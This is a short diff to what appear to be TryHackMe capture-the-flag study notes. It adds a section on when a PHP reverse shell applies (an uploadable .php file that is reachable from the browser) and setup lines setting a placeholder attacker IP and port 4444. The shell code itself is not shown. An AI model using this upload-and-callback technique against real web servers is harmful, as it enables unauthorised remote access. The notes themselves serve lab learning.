@@ -518,8 +518,28 @@ TRYHACKME{YOU_FOUND_THE_KEY}
 
 </details>
 
+<details>
+<summary>🐚 PHP Reverse Shell</summary>
 
+## 📌 When we use it
+
+Use a PHP reverse shell when:
+
+- Target website runs PHP
+- You can upload a `.php` file
+- Uploaded file can be opened from the browser
+- You want shell access from the web server
 
 ---
+
+## ⚙️ Setup
+
+Edit the reverse shell file:
+
+```php
+$ip = 'YOUR_KALI_IP';
+$port = 4444;
+</details>
+
 
 
